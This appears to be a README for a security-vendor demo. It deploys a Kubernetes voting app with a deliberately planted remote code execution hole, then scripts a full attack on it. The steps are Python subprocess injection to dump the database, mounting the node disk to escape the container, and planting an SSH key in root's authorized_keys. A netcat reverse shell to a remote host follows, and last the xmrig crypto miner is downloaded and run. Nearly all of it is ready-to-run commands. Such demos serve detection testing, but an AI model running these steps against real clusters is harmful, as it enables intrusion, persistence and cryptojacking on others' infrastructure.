# Lacework Cloud Workload Protection Platform - the voteapp application

Deploy a 4 micro services application and run a Remote Code Execution Attack

Just follow the steps below

## Deploy the Application

(you can deploy it within your preferred namespace, here we use default for simplicity)

```
$ kubectl apply -f vote.yml
```

```
$ kubectl get deploy
NAME     READY   UP-TO-DATE   AVAILABLE   AGE
db       1/1     1            1           82s
redis    1/1     1            1           82s
result   1/1     1            1           81s
vote     1/1     1            1           81s
worker   1/1     1            1           81s
```
We see that our vote deployment is delivered via 1 pod

```
$ kubectl get svc/vote
NAME   TYPE           CLUSTER-IP      EXTERNAL-IP                                                               PORT(S)        AGE
vote   LoadBalancer   172.20.224.94   a022c3b3d1ae542048da983c811fc41e-1943360625.eu-west-3.elb.amazonaws.com   80:30711/TCP   116s
```

## New connection from Vote App pod to Postgres pod

### Access the Application Web Interface
This interface is fake and created for the purpose of this RCE Attack.
It aims at illustrating what can be done when a developer left the capability for a Remote Code to be executed via a specific Query String parameter for a specific Application Endpoint.

Use your preferred browser and connect to http://URL_VOTE_APP//?hacker=true


### Install postgres on the pod and connect to DB
Please Run the following command in the Command Window:
```
__import__("subprocess").getoutput("apt-get update; apt-get install -y postgresql-client; export PGPASSWORD='postgres'; psql -h db -U postgres -c 'SELECT * FROM votes'")
```

## On a client machine - aka the Remote Host - (ex: your laptop), start a netcat server
### Start netcat (make sure port 5555 is open to the world on your host):
```
nc -knvlp 5555
```

## Gain access to the host where the Vote App pod is running on
### Mount the node filesystem into the pod
Please Run the following command in the Command Window:
```
__import__("subprocess").getoutput("mkdir -p /mnt/node_volume; mount /dev/xvda1 /mnt/node_volume")
```

You can ckeck the node volume is properly mounted by running:
```
$ kubectl exec -it od/vote-58f757c598-7kzgn  -- df -a
```

### Setup ssh on the pod, setup a pub/private key and install the pubkey in the nodes authorized key file
Please Run the following command in the Command Window:
```
__import__("subprocess").getoutput("[ -d '/mnt/node_volume/bin' ] && (rm -rf .ssh; mkdir .ssh; apt update; apt install ssh-client -y; ssh-keygen -t rsa -N '' -f .ssh/id_rsa; cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys)")
```

### Make a ssh connection from the pod to the node, install netcat
Please Run the following command in the Command Window:
```
__import__("subprocess").getoutput("[ -d '/mnt/node_volume/bin' ] && (SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST \"yum install -y nc; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | /usr/bin/nc REMOTE_HOST_IP 5555 1>/tmp/backpipe\")")
```

You should see the following message from the Remote Host:
```
Connection from 13.37.242.25 30628 received!
```


## On the Remote host 

### Download xmrig on the K8 node and unpack the files:
```
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
```

### Move into the xmrig dir and execute the binary:
(Do not let xmrig running for more than 10 min since you may face issues with your Cloud Service Provider)
```
cd xmrig-6.15.0 
chmod +x xmrig
xmrig
```






